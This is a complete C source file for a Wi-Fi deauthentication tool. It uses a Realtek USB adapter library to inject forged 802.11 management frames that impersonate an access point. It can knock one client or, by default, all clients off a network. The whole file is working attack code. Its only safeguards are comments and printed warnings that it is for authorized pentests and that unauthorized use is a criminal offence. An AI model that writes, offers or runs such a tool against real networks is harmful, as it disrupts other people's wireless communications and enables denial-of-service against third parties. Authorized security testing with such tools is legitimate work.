/*
 * deauth — Wi-Fi pentest tool: sends 802.11 deauthentication frames.
 *
 * ONLY use against networks you are authorized to test. Deauth frames
 * actively disconnect other people's clients; without authorization that
 * is interference with third-party communications and a criminal offence
 * in most jurisdictions. Intended for authorized pentests of your own
 * infrastructure (e.g. by the responsible technical lead).
 *
 * Sends as the apparent AP (SA=BSSID) to broadcast or to one client MAC --
 * the same pattern as aircrack-ng's `aireplay-ng --deauth`.
 *
 * Usage: ./deauth <channel> <bssid> [target-mac|broadcast] [count] [reason]
 * Default: target=broadcast (all clients), count=10, reason=7
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "rtl_usb.h"
#include "rtl_hal.h"
#include "rtl_rx.h"
#include "rtl_tx.h"

static int parse_mac(const char *s, uint8_t *m) {
    return sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) == 6;
}

static int build_deauth(uint8_t *out, const uint8_t bssid[6], const uint8_t dst[6],
                        uint16_t reason) {
    int p = 0;
    out[p++] = 0xC0; out[p++] = 0x00;      /* FC: Management, Deauthentication */
    out[p++] = 0x00; out[p++] = 0x00;      /* Duration */
    memcpy(out+p, dst,   6); p += 6;       /* Addr1 (DA): target client or broadcast */
    memcpy(out+p, bssid, 6); p += 6;       /* Addr2 (SA): posing as the AP */
    memcpy(out+p, bssid, 6); p += 6;       /* Addr3 (BSSID) */
    out[p++] = 0x00; out[p++] = 0x00;      /* Seq Ctl (HW does not ACK mgmt frames) */
    out[p++] = (uint8_t)(reason & 0xff);   /* Reason Code, little-endian */
    out[p++] = (uint8_t)(reason >> 8);
    return p;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: %s <channel> <bssid> [target-mac|broadcast] [count] [reason]\n", argv[0]);
        printf("  target default: broadcast (disconnect all clients)\n");
        printf("  count default: 10, reason default: 7\n\n");
        printf("ONLY use with authorization to test the target network.\n");
        return 1;
    }
    int channel = atoi(argv[1]);
    uint8_t bssid[6];
    if (!parse_mac(argv[2], bssid)) { printf("Invalid BSSID\n"); return 1; }

    int broadcast_target = !(argc > 3 && strcmp(argv[3], "broadcast") != 0);
    uint8_t dst[6];
    if (broadcast_target) memset(dst, 0xff, 6);
    else if (!parse_mac(argv[3], dst)) { printf("Invalid target MAC\n"); return 1; }

    int count = (argc > 4) ? atoi(argv[4]) : 10;
    uint16_t reason = (argc > 5) ? (uint16_t)atoi(argv[5]) : 7;

    printf("Deauth: channel %d, BSSID %s, target %s, %d frames, reason %u\n",
           channel, argv[2], broadcast_target ? "broadcast (all clients)" : argv[3],
           count, reason);
    printf("WARNING: only use with authorization for this network.\n\n");

    libusb_context *ctx = NULL;
    if (libusb_init(&ctx) != 0) { fprintf(stderr, "libusb_init failed\n"); return 1; }
    libusb_device_handle *h = NULL;
    uint16_t vid = 0, pid = 0; int claimed = 0;
    int rc = rtl_open_first_ex(ctx, &h, &vid, &pid, &claimed);
    if (rc == LIBUSB_ERROR_NO_DEVICE) { printf("No supported adapter found. Plug in the adapter.\n"); libusb_exit(ctx); return 2; }
    if (rc != 0 || !h) { fprintf(stderr, "Open failed: %s\n", libusb_error_name(rc)); libusb_exit(ctx); return 1; }
    printf("Device %04x:%04x, claim: %s\n\n", vid, pid, claimed ? "OK" : "NOT");

    rtl_rx_bind(ctx, rtl_chip_probe(vid, pid));   /* enable the asynchronous RX path */

    rc = rtl_hal_full_init(h, channel, 0, 1);
    if (rc != 0) { printf("Init failed (rc=%d).\n", rc); goto done; }

    uint8_t frame[26];
    int flen = build_deauth(frame, bssid, dst, reason);

    long ok = 0, err = 0;
    for (int i = 0; i < count; i++) {
        int r = rtl_tx_inject(h, frame, flen, RTL_RATE_6M, RTL_QSLT_MGNT, rtl_rx_bound_ops()->tx_ep_mgmt);
        if (r == 0) ok++; else { err++; if (err <= 3) printf("  TX error: %s\n", libusb_error_name(r)); }
        usleep(50000);   /* 50 ms between frames -- aireplay-ng's default rate */
    }
    printf("\nDone: %ld sent, %ld errors.\n", ok, err);
    if (ok > 0)
        printf("Check: the affected client(s) should have briefly lost their connection.\n");

done:
    rtl_rx_unbind();
    if (claimed) libusb_release_interface(h, 0);
    libusb_close(h);
    libusb_exit(ctx);
    return rc;
}
